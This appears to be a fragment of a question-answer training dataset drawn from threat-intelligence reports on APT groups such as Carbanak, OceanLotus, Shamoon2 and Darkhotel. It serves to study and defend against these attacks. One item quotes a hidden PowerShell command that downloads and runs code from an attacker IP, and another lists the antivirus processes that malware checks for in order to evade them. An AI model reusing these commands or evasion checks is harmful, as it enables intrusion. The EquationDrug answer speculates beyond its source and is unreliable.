Conclusion\nDino's binary shows an intense development effort, from custom data structures to a homemade file system. As with other Animal Farm binaries, it bears the mark of professional and experienced developers.\nBut Dino also shows a poor knowledge, or interest, from these developers in anti\u00adanalysis techniques \u2013 contrary to what was seen in Casper \u2013 as demonstrated, for example, by the verbosity of some Dino's log messages:\nAll those messages provide substantial help in understanding Dino's internal workings. One will also appreciate the numerous misspellings contained in the messages.\nRegarding Dino's victims, we know very little except that they were located in Iran in 2013. This is in accordance with the victimology described by Canada's CSE in its presentation:\nThat leads us to the final point of this blog: several signs suggest that Dino's creators are French speaking developers. These signs add to the pretty long list of indicators already supporting this hypothesis, in particular the ones mentioned by .\n\nQuestion: What indicators in Dino's binary suggest that its developers are French-speaking, and how do these indicators support the hypothesis of French-speaking developers within the Animal Farm group?\n\nAnswer:",
    "output": "Dino's binary contains a resource whose language code value is 1036, which corresponds to French. This language code is often set automatically by the compiler to the language of the developer's machine. Additionally, Dino's binary is statically linked with the GnuMP library, which includes file paths containing the term 'arithmetique,' the French translation of 'arithmetic.' These indicators suggest that Dino's developers are French-speaking, adding to a list of indicators supporting this hypothesis within the Animal Farm group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.4 Command and Control (C2) Servers\nThere appear to be four distinct types of C2 servers:\n\u2022 Linux servers used for issuing commands to deployed Carbanak instances and for receiving collected monitoring data;\n\u2022 Windows servers used for remote connections to victim systems;\n\u2022 Backup servers; and\n\u2022 Drop servers where additional executable files (e.g. remote administration tools) are hosted.\nServer rotation occurs more or less on a biweekly basis. For a complete list of identified Carbanak servers please check the regularly updated Carbanak IOC document. The current list of IOCs is provided at Appendix 3 in his document.\nSome of these C2 servers are responsible for dropping Ammyy (configuration and executable files), the KLG plugin configuration (list of processes to monitor) and the VNC server (both 32 and 64 bits to be injected in rundll). In one of the observed servers there was also a Metasploit module.\nVictim systems are catalogued in the servers' databases. The victims belong to a number of different communities, thus simplifying administration. In all, 85 different victims belonging to seven communities were found.\nBig Headline: Attacker\u00b4s operational details\nAdditionally, the malicious servers contain video files that capture a victim\u00b4s activity. While the videos are stored using a compressed format which provides poor image quality, the selected format minimizes upload bandwith and is of sufficient quality for the attackers to understand the victims' activities.\nThe video file naming conventions used the name of the application in the foreground (e.g., Outlook, Cmd, etc.) and only recorded user activity. This helped the attackers to both navigate to files of interest and to discard superfluous files.\nUsing the intelligence gained from video and other monitoring techniques, the attackers developed an operational picture of the victim's workflow, tooling and practices. This picture helps the attackers to deploy their malicious operations, for example:\n\u2022 Attackers created fake transactions in the victim's internal database after the verification process, thus avoiding discovery of the fraudulent activity;\n\u2022 Attackers used the victim's internal command utilities to insert fraudulent operations in the transaction queue.\nIn general, the attackers demonstrated great versatility, using attack methodologies best suited to a specific victim's operational methodology. However, they seemed to deliberately limit the amount of money stolen per victim to $10 million USD. This limit may be explained as the maximum amount\nof money that can be transferred via mule services, or the maximum amount of money that is budgeted in banks for fraud risks in order to minimize the chances of LEAs and the bank\u00b4s anti-fraud teams from doing a full blown analysis.\nSensitive bank documents have be found on the servers that were controlling Carbanak. They included classified emails, manuals, crypto keys, passwords and so on. For example, the file in the above figure has KVC (key verification codes) keys that are used by ATMs to check the integrity of the PIN numbers of its users.\nIn other cases involving ATMs, the criminals were able to control computers that had access to the internal ATM network. If the bank had enabled remote access to ATMs, the criminals started using this access to remotely withdraw cash. Criminals used no malware to operate the ATM dispenser; instead they used standard utilities to control and test ATM equipment.\nBig Headline: 3. Conclusions\nMalware targeting the finance industry (both companies and consumers) continues to evolve. The Carbanak malware used in the on-going campaign described in this report has been very successful in terms of generating revenue. Of particular interest are the attack methods, similar to those used in sophisticated cyber-espionage APTs. As such, they represent a new and disturbing trend in the cybercrime market of increasing attack sophistication.\nDespite increased awareness of cybercrime within the financial services sector, it appears that spear phishing attacks and old exploits (for which patches have been disseminated) remain effective against larger companies. Attackers always use this minimal effort approach in order to bypass a victim\u00b4s defenses.\nAdvanced control and fraud detection systems have been used for years by the financial services industry. However, these focus on fraudulent transactions within customer accounts. The Carbanak attackers bypassed these protections, by for example, using the industry-wide funds transfer (the SWIFT network), updating balances of account holders and using disbursement mechanisms (the ATM network).\nIn neither of these cases did the attackers exploit a vulnerability within the service. Instead, they studied the victim\u00b4s internal procedures and pinpointed who they should impersonate locally in order to process fraudulent transactions through the aforementioned services.\nIt is clear that the attackers were very familiar with financial services software and networks. As part of an automated reconnaissance phase, the Carbanak malware checked victim systems for the presence of specialized and specific banking software. Only after the presence of banking systems was confirmed, were victims further exploited. To date, attacks against approximately 300 IP addresses around the world have been observed on analyzed C2s. It is possible that these attacks were coordinated to maximize returns prior to industry-wide information sharing and the implementation of countermeasures.\nExisting telemetry indicates that the Carbanak attackers are trying to expand operations to other Baltic and Central Europe countries, the Middle East, Asia and Africa. Carbanak may be responsible for losses as high as $1 billion USD.\nWe believe that the Carbanak campaign is a clear indicator of a new era in cybercrime in which criminals use APT techniques directly against the financial industry instead of through its customers. APTs are not only for stealing information anymore.\nBig Headline: APPENDIX 2: BAT file to detect infection\n@echo off for /f %%a in ('hostname') do set \"name=%%a\" echo %name% del /f %name%.log 2> nul if exist \"c:\\Documents and settings\\All users\\application data\\ mozilla\\*.bin\" echo \"BIN detected\" >> %name%.log if exist %SYSTEMROOT%\\System32\\com\\svchost.exe echo \"COM detected\" >> %name%.log if exist \"c:\\ProgramData\\mozilla\\*.bin\" echo \"BIN2 detected\" >> %name%.log if exist %SYSTEMROOT%\\paexec* echo \"Paexec detected\" >> %name%.log if exist %SYSTEMROOT%\\Syswow64\\com\\svchost.exe echo \"COM64 detected\" >> %name%.log\nSC QUERY state= all | find \"SERVICE_NAME\" | findstr \"Sys$\" if q%ERRORLEVEL% == q0 SC QUERY state= all | find\n\"SERVICE_NAME\" | findstr \"Sys$\" >> %name%.log\nif not exist %name%.log echo Ok > %name%.log xcopy /y %name%.log \"\\\\<IP>\\logVirus\nRead the text above and answer this question: How does the Carbanak APT utilize different types of C2 servers in its operations, and what roles do each of these servers play?",
    "output": "The Carbanak APT uses four distinct types of C2 servers: Linux servers for issuing commands and receiving monitoring data, Windows servers for remote connections to victim systems, backup servers, and drop servers for hosting additional executable files like remote administration tools. These servers facilitate various aspects of the attack, including command and control, data exfiltration, and maintaining persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: \u7b2c\u4e00\u7ae0 OceanLotus \u6982\u8ff0\n2012\u5e74 4\u6708\u8d77\u81f3\u4eca,\u67d0\u5883\u5916\u9ed1\u5ba2\u7ec4\u7ec7\u5bf9\u4e2d\u56fd\u653f\u5e9c\u3001\u79d1\u7814\u9662\u6240\u3001\u6d77\u4e8b\u673a\u6784\u3001\u6d77\u57df\u5efa\u8bbe\u3001\u822a\u8fd0\u4f01\u4e1a\u7b49\u76f8\u5173\u91cd\u8981\u9886\u57df\u5c55\u5f00\u4e86\u6709\u7ec4\u7ec7\u3001\u6709\u8ba1\u5212\u3001\u6709\u9488\u5bf9\u6027\u7684\u957f\u65f6\u95f4\u4e0d\u95f4\u65ad\u653b\u51fb\u3002\u8be5\u7ec4\u7ec7\u4e3b\u8981\u901a\u8fc7\u9c7c\u53c9\u653b\u51fb\u548c\u6c34\u5751\u653b\u51fb\u7b49\u65b9\u6cd5,\u914d\u5408\u591a\u79cd\u793e\u4f1a\u5de5\u7a0b\u5b66\u624b\u6bb5\u8fdb\u884c\u6e17\u900f,\u5411\u5883\u5185\u7279\u5b9a\u76ee\u6807\u4eba\u7fa4\u4f20\u64ad\u7279\u79cd\u6728\u9a6c\u7a0b\u5e8f,\u79d8\u5bc6\u63a7\u5236\u90e8\u5206\u653f\u5e9c\u4eba\u5458\u3001\u5916\u5305\u5546\u548c\u884c\u4e1a\u4e13\u5bb6\u7684\u7535\u8111\u7cfb\u7edf,\u7a83\u53d6\u7cfb\u7edf\u4e2d\u76f8\u5173\u9886\u57df\u7684\u673a\u5bc6\u8d44\u6599\u3002\n\u6839\u636e\u8be5\u7ec4\u7ec7\u7684\u67d0\u4e9b\u653b\u51fb\u7279\u70b9,\u6211\u4eec\u5c06\u5176\u547d\u540d\u4e3a OceanLotus\u3002\n\u76ee\u524d\u5df2\u7ecf\u6355\u83b7\u7684\u4e0e OceanLotus\u76f8\u5173\u7684\u7b2c\u4e00\u4e2a\u7279\u79cd\u6728\u9a6c\u51fa\u73b0\u5728 2012\u5e74 4\u6708\u3002\u5728\u6b64\u540e\u7684 3\u5e74\u4e2d,\u6211\u4eec\u53c8\u5148\u540e\u6355\u83b7\u4e86\u4e0e\u8be5\u7ec4\u7ec7\u76f8\u5173\u7684 4\u79cd\u4e0d\u540c\u5f62\u6001\u7684\u7279\u79cd\u6728\u9a6c\u7a0b\u5e8f\u6837\u672c 100 \u4f59\u4e2a,\u8fd9\u4e9b\u6728\u9a6c\u7684\u611f\u67d3\u8005\u904d\u5e03\u56fd\u5185 29\u4e2a\u7701\u7ea7\u884c\u653f\u533a\u548c\u5883\u5916\u7684 36 \u4e2a\u56fd\u5bb6\u3002\u6b64\u5916,\u4e3a\u4e86\u9690\u853d\u884c\u8e2a,\u8be5\u7ec4\u7ec7\u8fd8\u81f3\u5c11\u5148\u540e\u5728 6 \u4e2a\u56fd\u5bb6\u6ce8\u518c\u4e86\u7528\u4e8e\u8fdc\u7a0b\u63a7\u5236\u88ab\u611f\u67d3\u8005\u7684 C2(\u4e5f\u79f0 C&C,\u662f Command and Control\u7684\u7f29\u5199)\u670d\u52a1\u5668\u57df\u540d 35\u4e2a,\u76f8\u5173\u670d\u52a1\u5668 IP\u5730\u5740 19\u4e2a,\u670d\u52a1\u5668\u5206\u5e03\u5728\u5168\u7403 13\u4e2a\u4ee5\u4e0a\u7684\u4e0d\u540c\u56fd\u5bb6\u3002\n\u4ece OceanLotus\u53d1\u52a8\u653b\u51fb\u7684\u5386\u53f2\u6765\u770b,\u4ee5\u4e0b\u65f6\u95f4\u70b9\u548c\u91cd\u5927\u4e8b\u4ef6\u6700\u503c\u5f97\u5173\u6ce8:\n1) 2012\u5e74 4\u6708,\u9996\u6b21\u53d1\u73b0\u4e0e\u8be5\u7ec4\u7ec7\u76f8\u5173\u7684\u6728\u9a6c\u3002OceanLotus\u7ec4\u7ec7\u7684\u6e17\u900f\u653b\u51fb\u5c31\u6b64\u5f00\u59cb\u3002\u4f46\u5728\u6b64\u540e\u7684\u4e24\u5e74\u5de6\u53f3\u65f6\u95f4\u91cc,OceanLotus\u5e76\u4e0d\u6d3b\u8dc3\u3002\n2) 2014\u5e74 2\u6708,OceanLotus\u5f00\u59cb\u901a\u8fc7\u9c7c\u53c9\u653b\u51fb\u7684\u65b9\u6cd5\u5bf9\u6211\u4eec\u56fd\u5185\u76ee\u6807\u53d1\u8d77\u5b9a\u5411\u653b\u51fb,OceanLotus \u8fdb\u5165\u6d3b\u8dc3\u671f,\u5e76\u5728\u6b64\u540e\u7684 14 \u4e2a\u6708\u5185\u5bf9\u6211\u56fd\u591a\u4e2a\u76ee\u6807\u53d1\u52a8\u4e86\u4e0d\u95f4\u65ad\u7684\u6301\u7eed\u653b\u51fb\u3002\n3) 2014\u5e74 5\u6708,OceanLotus\u5bf9\u56fd\u5185\u67d0\u6743\u5a01\u6d77\u6d0b\u7814\u7a76\u673a\u6784\u53d1\u52a8\u5927\u89c4\u6a21\u9c7c\u53c9\u653b\u51fb,\u5e76\u5f62\u6210\u4e86\u8fc7\u53bb 14\u4e2a\u6708\u4e2d\u9c7c\u53c9\u653b\u51fb\u7684\u6700\u9ad8\u5cf0\u3002\n4) \u540c\u6837\u662f\u5728 2014\u5e74 5\u6708,OceanLotus\u8fd8\u5bf9\u56fd\u5185\u67d0\u6d77\u6d0b\u5efa\u8bbe\u673a\u6784\u7684\u5b98\u65b9\u7f51\u7ad9\u8fdb\u884c\u4e86\u7be1\u6539\u548c\u6302\u9a6c,\u5f62\u6210\u4e86\u7b2c\u4e00\u8f6e\u89c4\u6a21\u8f83\u5927\u7684\u6c34\u5751\u653b\u51fb\u3002\n5) 2014\u5e74 6\u6708,OceanLotus\u5f00\u59cb\u5927\u91cf\u5411\u4e2d\u56fd\u6e14\u4e1a\u8d44\u6e90\u76f8\u5173\u673a\u6784\u56e2\u4f53\u53d1\u9c7c\u53c9\u653b\u51fb\u3002\n6) 2014\u5e74 9\u6708,OceanLotus\u9488\u5bf9\u4e8e\u4e2d\u56fd\u6d77\u57df\u5efa\u8bbe\u76f8\u5173\u884c\u4e1a\u53d1\u8d77\u6c34\u5751\u653b\u51fb,\u5f62\u6210\u4e86\u7b2c\u4e8c\u8f6e\u5927\u89c4\u6a21\u6c34\u5751\u653b\u51fb\u3002\n7) 2014\u5e74 11\u6708,OceanLotus\u5f00\u59cb\u5c06\u539f\u6709\u7279\u79cd\u6728\u9a6c\u5927\u89c4\u6a21\u7684\u66f4\u6362\u4e3a\u4e00\u79cd\u66f4\u5177\u653b\u51fb\u6027\u548c\u9690\u853d\u6027\u7684\u4e91\u63a7\u6728\u9a6c,\u5e76\u7ee7\u7eed\u5bf9\u6211\u56fd\u5883\u5185\u76ee\u6807\u53d1\u52a8\u653b\u51fb\u3002\n8) 2015\u5e74 1\u6708 19\u65e5,OceanLotus\u9488\u5bf9\u4e2d\u56fd\u653f\u5e9c\u67d0\u6d77\u4e8b\u673a\u6784\u7f51\u7ad9\u8fdb\u884c\u6302\u9a6c\u653b\u51fb,\u7b2c\u4e09\u8f6e\u5927\u89c4\u6a21\u6c34\u5751\u653b\u51fb\u5f62\u6210\u3002\n9) 2015\u5e74 3\u6708\u81f3\u4eca,OceanLotus\u9488\u5bf9\u66f4\u591a\u4e2d\u56fd\u653f\u5e9c\u76f4\u5c5e\u673a\u6784\u53d1\u8d77\u653b\u51fb\u3002\n\u901a\u8fc7\u5bf9 OceanLotus\u7ec4\u7ec7\u6570\u5e74\u6d3b\u52a8\u60c5\u51b5\u7684\u8ddf\u8e2a\u4e0e\u53d6\u8bc1,\u6211\u4eec\u5df2\u7ecf\u786e\u8ba4\u4e86\u5927\u91cf\u7684\u53d7\u5bb3\u8005\u3002\u4e0b\u56fe\u4e3a 2014\u5e74 2\u6708\u81f3\u4eca,\u5168\u7403\u6bcf\u6708\u611f\u67d3 OceanLotus\u7279\u79cd\u6728\u9a6c\u7684\u7535\u8111\u6570\u91cf\u8d8b\u52bf\u5206\u5e03\u3002\n\u4ece\u5730\u57df\u5206\u5e03\u4e0a\u770b,OceanLotus\u7279\u79cd\u6728\u9a6c\u7684\u5883\u5185\u611f\u67d3\u8005\u5360\u5168\u7403\u611f\u67d3\u603b\u91cf\u7684 92.3%\u3002\u800c\u5728\u5883\u5185\u611f\u67d3\u8005\u4e2d,\u5317\u4eac\u5730\u533a\u6700\u591a,\u5360 22.7%,\u5929\u6d25\u6b21\u4e4b,\u4e3a 15.5%\u3002\n\u4e0b\u56fe\u4e3a\u5883\u5185 OceanLotus\u7279\u79cd\u6728\u9a6c\u611f\u67d3\u8005\u6570\u91cf\u5730\u57df\u5206\u5e03\u56fe\u3002\n\u6280\u672f\u5206\u6790\u663e\u793a,\u521d\u671f\u7684 OceanLotus\u7279\u79cd\u6728\u9a6c\u6280\u672f\u5e76\u4e0d\u590d\u6742,\u6bd4\u8f83\u5bb9\u6613\u53d1\u73b0\u548c\u67e5\u6740\u3002\u4f46\u5230\u4e86 2014\u5e74\u4ee5\u540e,OceanLotus\u7279\u79cd\u6728\u9a6c\u5f00\u59cb\u91c7\u7528\u5305\u62ec\u6587\u4ef6\u4f2a\u88c5\u3001\u968f\u673a\u52a0\u5bc6\u548c\u81ea\u6211\u9500\u6bc1\u7b49\u4e00\u7cfb\u5217\u590d\u6742\u7684\u653b\u51fb\u6280\u672f\u4e0e\u5b89\u5168\u8f6f\u4ef6\u8fdb\u884c\u5bf9\u6297,\u67e5\u6740\u548c\u6355\u6349\u7684\u96be\u5ea6\u5927\u5927\u589e\u52a0\u3002\u800c\u5230\u4e86 2014\u5e74 11\u6708\u4ee5\u540e,OceanLotus\u7279\u79cd\u6728\u9a6c\u5f00\u59cb\u8f6c\u5411\u4e91\u63a7\u6280\u672f,\u653b\u51fb\u7684\u5371\u9669\u6027\u3001\u4e0d\u786e\u5b9a\u6027\u4e0e\u6728\u9a6c\u8bc6\u522b\u67e5\u6740\u7684\u96be\u5ea6\u90fd\u5927\u5927\u589e\u5f3a\u3002\n\u7efc\u5408\u6765\u770b,OceanLotus \u7ec4\u7ec7\u7684\u653b\u51fb\u5468\u671f\u4e4b\u957f(\u6301\u7eed 3\u5e74\u4ee5\u4e0a)\u3001\u653b\u51fb\u76ee\u6807\u4e4b\u660e\u786e\u3001\u653b\u51fb\u6280\u672f\u4e4b\u590d\u6742\u3001\u793e\u5de5\u624b\u6bb5\u4e4b\u7cbe\u51c6,\u90fd\u8bf4\u660e\u8be5\u7ec4\u7ec7\u7edd\u975e\u4e00\u822c\u7684\u6c11\u95f4\u9ed1\u5ba2\u7ec4\u7ec7,\u800c\u5f88\u6709\u53ef\u80fd\u662f\u5177\u6709\u56fd\u5916\u653f\u5e9c\u652f\u6301\u80cc\u666f\u7684\u3001\u9ad8\u5ea6\u7ec4\u7ec7\u5316\u7684\u3001\u4e13\u4e1a\u5316\u7684\u5883\u5916\u56fd\u5bb6\u7ea7\u9ed1\u5ba2\u7ec4\u7ec7\u3002\n\nWhy did the OceanLotus group transition to using cloud-controlled malware in November 2014, and how did this change impact the effectiveness and detectability of their attacks?",
    "output": "The OceanLotus group transitioned to using cloud-controlled malware in November 2014 to enhance the attack's dangerousness, unpredictability, and to increase the difficulty of malware identification and removal. This shift made their operations more effective by introducing greater complexity and stealth. Prior to this, their initial malware was relatively simple and easier to detect and neutralize. However, starting from 2014, they began employing advanced techniques such as file disguise, random encryption, and self-destruction to evade security software. The adoption of cloud control technology significantly amplified these challenges, making it much harder for security measures to counteract their activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the EquationDrug APT use data obfuscation to conceal its command and control communications?",
    "output": "Data obfuscation is a technique used by adversaries to hide command and control (C2) communications from detection. In the case of the EquationDrug APT, data obfuscation is used to conceal its C2 communications. Although the #Given Context# does not explicitly mention data obfuscation, it does mention that 'most of this information is carefully protected with obfuscation or encryption algorithms to prevent quick recognition.' This suggests that the EquationDrug APT uses data obfuscation to hide its internal strings and codenames, making it more difficult for analysts to understand the malware's behavior. Furthermore, the use of custom message-passing interfaces and kernel-mode components may also be used to obfuscate C2 communications. Additionally, the #Given Context# mentions that the link timestamp can be altered by the developer in a way that's not always possible to spot, which could be another form of data obfuscation used by the EquationDrug APT. Overall, the EquationDrug APT likely uses data obfuscation to conceal its C2 communications and make it more difficult for analysts to detect and understand its behavior.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nAttack on French Diplomat Linked to Operation Lotus Blossom \u00adPalo Alto Networks Blog\nWe observed a targeted attack in November directed at an individual working for the French Ministry of Foreign Affairs. The attack involved a spear\u00adphishing email sent to a single French diplomat based in Taipei, Taiwan and contained an invitation to a Science and Technology support group event.\nThe actors attempted to exploit CVE\u00ad2014\u00ad6332 using a slightly modified version of the proof\u00adof\u00ad(<http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/>)concept (POC) code to install a Trojan called Emissary, which is related to the campaign. The TTPs used in this attack also match those detailed in the paper. The targeting of this individual suggests the actors are interested in breaching the French Ministry of Foreign Affairs itself or gaining insights into relations between France and Taiwan.\nWe have created the tag for AutoFocus users to track this threat.\n\nIn the context of the targeted attack linked to Operation Lotus Blossom, how did the actors attempt to exploit the vulnerability CVE-2014-6332, and what was the significance of this methodology in the broader campaign?",
    "output": "The actors attempted to exploit CVE-2014-6332 using a slightly modified version of the proof-of-concept (POC) code to install a Trojan called Emissary, which is related to the campaign. This methodology is significant because it matches the tactics, techniques, and procedures (TTPs) detailed in previous reports on Operation Lotus Blossom. The use of this specific vulnerability and the installation of the Emissary Trojan indicate a sophisticated and targeted approach aimed at breaching the French Ministry of Foreign Affairs or gaining insights into relations between France and Taiwan.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Initial Discoveries\nThe following new samples were likely delivered via similar spear phishing campaigns as described in IBM's research. All three shared the same IPs and URLs, also provided below. These samples were located by pivoting on document attributes. In this case, a sample from the IBM report indicated the document author 'gerry.knight' which led us to the following three additional samples. MD5\nMD5\n2a0df97277ddb361cecf8726df6d78ac\n5e5ea1a67c2538dbc01df28e4ea87472\nd30b8468d16b631cafe458fd94cc3196\nIPs\n104.218.120[.]128\n69.87.223[.]26\n5.254.100[.]200\nURLs\nanalytics-google[.]org:69/checkFile.aspx analytics-google[.]org\n69.87.223[.]26:8080/p\nThe following is a screenshot of a macro-enabled document captured from sample 5e5ea1a67c2538dbc01df28e4ea87472:\nOnce enabled the extracted macro executed the following:\n'powershell.exe -w hidden -noni -nop -c \"iex(New-Object\nSystem.Net.WebClient).DownloadString(\\'http://69.87.223.26:8080/p\\')\"'\nBig Headline: Pivoting on Passive DNS\nFrom the previous samples, we performed a passive DNS lookup on the IPs. We found get.adobe.go-microstf[.]com hosted at 104.218.120[.]128 around the time this campaign was ongoing, November 2016.\nResearching the domain go-microstf[.]com, hosted at 45.63.10[.]99, revealed yet another iteration of malicious executables. In this case, a URL used to download the PowerShell component shared a naming convention found in the IBM report, http://69.87.223[.]26:8080/eiloShaegae1 and connected to the IP address used by the previous three samples. The following are IOCs related to this domain:\nMD5\n83be35956e5d409306a81e88a1dc89fd\nIPs\n45.63.10[.]99\n69.87.223[.]26\nURLs\ngo-microstf[.]com\n69.87.223[.]26:8080/eiloShaegae1 go-microstf[.]com/checkfile.aspx\nThe domain go-microstf[.]com was originally set up to spoof Google Analytics login page. The following screenshot is from the malicious domain:\nBig Headline: Possible Connections to Iranian state-sponsored Kittens\nFinally, research yielded a relatively unique sample. This particular iteration was submitted to VirusTotal on September 16, 2016. The majority of samples analyzed to date were submitted no earlier than mid-October, with most being submitted in January 2017 or later. We were able to discover this particular version by diving further into connections to analytics-google[.]org. Unlike newer samples, this one created a unique file 'sloo.exe'. The file was created at C:\\Documents and Settings\\Admin\\Local Settings\\Temp\\sloo.exe. In addition to this file, the sample also contacted 104.238.184[.]252 for the PowerShell executable.\nResearchers at (<http://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/>)Palo Alto have attributed sloo.exe and related activities to threat actors of a likely Iranian state-sponsored origin which they've named Magic Hound. The group Magic Hound is linked via infrastructure and tools to the Rocket Kitten threat actor group although Palo Alto cannot confirm the extent of any relationship between the two groups.\nDell Secureworks analysts recently (<https://www.secureworks.com/blog/iranian-pupyrat-bites-middle-eastern-organizations>)concluded that domains discussed in the IBM report were linked to the Iranian PuppyRAT. In addition, Dell analysts have assessed with high-confidence these activities are attributable to Iranian state-sponsored activities.\nIOCs for this version were:\nMD5\n07d6406036d6e06dc8019e3ade6ee7de\nIPs\n104.238.184[.]252\n5.254.100[.]200\nURLs\nanalytics-google[.]org:69/checkFile.aspx\nRead the text above and answer this question: What steps did the researchers take to uncover further malicious domains and executables related to the Shamoon2 campaign, and what specific techniques were used to link these findings to the original campaign?",
    "output": "The researchers performed a passive DNS lookup on the IPs associated with the initial samples. This led them to discover the domain get.adobe.go-microstf[.]com hosted at 104.218.120[.]128 around the time the campaign was ongoing, in November 2016. Further research on the domain go-microstf[.]com, hosted at 45.63.10[.]99, revealed another iteration of malicious executables. The URL used to download the PowerShell component shared a naming convention found in the IBM report and connected to the IP address used by the previous three samples. This methodology allowed the researchers to link these findings to the original Shamoon2 campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Sharp Panda APT group use Phishing: Spearphishing Attachment to gain initial access to targeted networks in Southeast Asian government entities?",
    "output": "Phishing: Spearphishing Attachment is a tactic used by adversaries to send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. In the case of the Sharp Panda APT group, they use spear-phishing emails to target Southeast Asian government entities. These emails typically contain a Word document with government-themed lures that leverage a remote template to download and run a malicious RTF document, weaponized with the infamous RoyalRoad kit. The attackers rely on the victim to open the attachment and execute the malware, which then starts a chain of in-memory loaders, ultimately delivering a final backdoor, such as the VictoryDll or Soul modular framework. By using Phishing: Spearphishing Attachment, the Sharp Panda APT group is able to gain initial access to targeted networks, allowing them to conduct espionage and gather sensitive information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Consistent use of obfuscated .hta downloaders\nWhether the infection is achieved through spearphishing, physical access to a system or the Hacking Team Flash 0day, there frequently seems to be a common method for a newly-infected system to communicate with Darkhotel's c2:\nA lightly obfuscated (double escaped set of javascript variable values) script maintained within an .hta file writes an executable to disk and executes it.\nIt is interesting that this particular group has for years now deployed backdoor and downloader code in the form of .hta files. In 2010, we observed it re-purposing articles by the US think-tank, Brookings Institute, in order to attack North Korean-related targets with . It also emailed links to its to North Korean tourist groups, economists with an interest in North Korea, and more. It's somewhat strange to see such heavy reliance on older Windows-specific technology like HTML applications, introduced .\nFrom the recent sendspace.servermsys.com/downloader.hta:\nAfter execution and escaping a couple of variables, the .hta uses ancient Adodb.stream components in order to write out a string xor'd with 0x3d as an executable file and runs it.\nThis code results in the execution of \"internet_explorer_Smart_recovery.exe\" 054471f7e168e016c565412227acfe7f, and a hidden browser window phoning back to its c2. In this case,\nit seems that Darkhotel operators are checking as to whether or not the victim's default browser is Internet Explorer, as all versions of IE return the value \"0\" and other browsers leave \"appMinorVersion\" undefined. This data collection seems somewhat odd, because .hta files are supported and run by mshta.exe on Windows systems only, still delivered with Windows 8. Perhaps it is an artefact from early development of the code. Here is a recent version: \"hxxp://sendspace.servermsys.com/readme.php?type=execution&result=created_and_executed&info=\" + navigator.appMinorVersion + \"\nThe \"internet_explorer_Smart_recovery.exe\" file is a simple obfuscated downloader. A series of xor 0x28 loops decrypt the contents of a self-deletion batch file, which is then written to disk and executed. Later in the execution, a more complex rc4 loop decrypts the download url and other strings and imports.\nWhen finished, this url string decryption and connectback looks like\nhttp://sendspace.servermsys.com/wnctprx. The file is downloaded (b1f56a54309147b07dda54623fecbb89) to \".tmp\" file in %temp%, executed, and the downloader exits. This larger file is a backdoor/downloader that includes ssh functionality, and drops its keys to disk for ssh interaction. We find older Darkhotel information stealers dropped and run on the system by these downloaders.\nBig Headline: Spearphishing and .rar Attachments with RTLO\nThe Darkhotel APT will relentlessly spearphish specific targets in order to successfully compromise systems. Some targets are spearphished repeatedly with much the same social-engineering schemes.\nFor example, the attachment \"schedule(2.11~16).rar\" could be sent on February 10th, with Darkhotel returning to the same targets in late May for a second attempt with attachment \"schedule(6.1~6).rar\".\nIt consistently archives RTLO .scr executable files within .rar archives, in order to appear to the target as innocuous .jpg files. These executable files are lite droppers, maintaining these decoy jpeg files, and code to create an lnk downloader.\nWhen the target attempts to open what they think is a jpg image file, the executable code runs and drops a jpg image to disk, then opens it with mspaint.exe in the background. This \"congratulations\" document is in Korean, revealing a likely characteristic of the intended target.\nWhile the image is displayed, the code drops an unusual mspaint.lnk shortcut to disk and launches it. The shortcut maintains a multiline target shell script. This technique is also used by other APTs as persistence mechanisms, as documented by our Mandiant colleagues. The 64kb lnk file is downloader code:\nWhen this lnk file is executed, it begins an AJAX-based download process for the \"unzip.js\" file (a07124b65a76ee7d721d746fd8047066) on openofficev.info. This is another wscript file implementing AJAX to download and execute a relatively large compiled executable:\nThis executable code is saved to %temp%\\csrtsrm.exe and executed there. It is a relatively large executable (~1.2 mb) that injects malicious code and spawns remote threads into legitimate processes.\nBig Headline: Stolen certificates and evasion\nThe group appears to maintain a stockpile of stolen certificates and deploys their downloaders and the backdoors signed with them. Some of the more recent revoked certificates include ones that belong to Xuchang Hongguang Technology Co. Ltd.\nDarkhotel now tends to hide its code behind layers of encryption. It is likely that it has slowly adapted to attacking better-defended environments and prefers not to burn these stolen digital certificates. In previous attacks it would simply have taken advantage of a long list of weakly implemented, broken certificates.\nNot only are its obfuscation techniques becoming stronger, but its anti-detection technology list is growing. For example, this signed downloader (d896ebfc819741e0a97c651de1d15fec) decrypts a set of anti-malware strings in stages to identify defensive technologies on a newly-infected system, and then opens each process, looking for a matching image name:\nc:\\avast! sandbox\\WINDOWS\\system32\\kernel32.dll - Avast!\navp.exe - Kaspersky Lab\nmcagent.exe;mcuicnt.exe - Intel/Mcafee\nbdagent.exe - BitDefender\nravmon.exe,ravmond.exe - Beijing Rising\n360tray.exe,360sd.exe,360rp.exe,exeMgr.exe - Qihoo 360\nayagent.aye,avguard.;avgntsd.exe - Avira Antivirus\nccsvchst.exe,nis.exe - Symantec Norton\navgui.exe,avgidsagent.exe,avastui.exe,avastsvc.exe - Avast!\nmsseces.exe;msmpeng.exe - Microsoft Security Essentials and Microsoft Anti-Malware Service\nAVK.exe;AVKTray.exe - G-Data\navas.exe - TrustPort AV\ntptray.exe - Toshiba utility\nfsma32.exe;fsorsp.exe - F-Secure\neconser.exe;escanmon.exe - Microworld Technologies eScan\nSrvLoad.exe;PSHost.exe - Panda Software\negui.exe;ekrn.exe - ESET Smart Security\npctsSvc.exe;pctsGui.exe - PC Tools Spyware Doctor\ncasc.exe;UmxEngine.exe - CA Security Center\ncmdagent.exe;cfp.exe - Comodo\nKVSrvXP.exe;KVMonXP.exe - Jiangmin Antivirus\nnsesvc.exe;CClaw.exe - Norman\nV3Svc.exe - Ahnlab\nguardxup. - IKARUS\nFProtTray. - F-Prot\nop_mon - Agnitum Outpost\nvba332ldr.;dwengine. - DrWeb\nEven the identifying information that the 